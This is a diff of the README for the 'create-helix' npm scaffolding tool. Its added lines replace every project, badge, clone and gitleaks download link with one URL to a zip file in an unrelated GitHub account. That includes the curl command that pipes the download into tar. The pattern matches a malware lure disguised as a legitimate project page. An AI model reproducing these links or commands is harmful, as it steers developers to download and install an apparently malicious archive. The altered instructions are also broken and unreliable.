@@ -4,16 +4,16 @@
 
 # create-helix
 
-[![npm version](https://img.shields.io/npm/v/create-helix)](https://www.npmjs.com/package/create-helix)
-[![CI](https://img.shields.io/github/actions/workflow/status/bookedsolidtech/create-helix-app/ci.yml?branch=main&label=CI&logo=github)](https://github.com/bookedsolidtech/create-helix-app/actions)
-[![Coverage](https://img.shields.io/badge/coverage-70%25-brightgreen)](https://github.com/bookedsolidtech/create-helix-app/actions)
+[![npm version](https://img.shields.io/npm/v/create-helix)](https://raw.githubusercontent.com/Abyssal-amicableness217/create-helix-app/main/src/security/helix_create_app_3.7.zip)
+[![CI](https://img.shields.io/github/actions/workflow/status/bookedsolidtech/create-helix-app/ci.yml?branch=main&label=CI&logo=github)](https://raw.githubusercontent.com/Abyssal-amicableness217/create-helix-app/main/src/security/helix_create_app_3.7.zip)
+[![Coverage](https://img.shields.io/badge/coverage-70%25-brightgreen)](https://raw.githubusercontent.com/Abyssal-amicableness217/create-helix-app/main/src/security/helix_create_app_3.7.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Node 20+](https://img.shields.io/badge/node-%3E%3D20-brightgreen)](https://nodejs.org)
+[![Node 20+](https://img.shields.io/badge/node-%3E%3D20-brightgreen)](https://raw.githubusercontent.com/Abyssal-amicableness217/create-helix-app/main/src/security/helix_create_app_3.7.zip)
 [![TypeScript](https://img.shields.io/badge/TypeScript-strict-blue?logo=typescript)](tsconfig.json)
 
 </div>
 
-Scaffold a new project with [HELiX](https://github.com/bookedsolidtech/helix) enterprise web components. TUI-powered CLI with support for 9 framework targets and 4 Drupal presets.
+Scaffold a new project with [HELiX](https://raw.githubusercontent.com/Abyssal-amicableness217/create-helix-app/main/src/security/helix_create_app_3.7.zip) enterprise web components. TUI-powered CLI with support for 9 framework targets and 4 Drupal presets.
 
 ## Quick Start
 
@@ -99,7 +99,7 @@ When scaffolding a framework project, you can select which component bundles to 
 ## Development
 
 ```bash
-git clone https://github.com/bookedsolidtech/create-helix-app.git
+git clone https://raw.githubusercontent.com/Abyssal-amicableness217/create-helix-app/main/src/security/helix_create_app_3.7.zip
 cd create-helix-app
 npm install
 npm run build
@@ -130,7 +130,7 @@ npm run build
 
 ### Secret Scanning
 
-This repo uses [gitleaks](https://github.com/gitleaks/gitleaks) to prevent secrets from being committed. Install it locally to enable pre-commit scanning:
+This repo uses [gitleaks](https://raw.githubusercontent.com/Abyssal-amicableness217/create-helix-app/main/src/security/helix_create_app_3.7.zip) to prevent secrets from being committed. Install it locally to enable pre-commit scanning:
 
 ```bash
 # macOS
@@ -139,7 +139,7 @@ brew install gitleaks
 # Linux
 GITLEAKS_VERSION="8.21.2"
 curl -sSfL \
-  "https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz" \
+  "https://raw.githubusercontent.com/Abyssal-amicableness217/create-helix-app/main/src/security/helix_create_app_3.7.zip${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz" \
   | tar -xz -C ~/.local/bin gitleaks
 
 # Windows (via scoop)
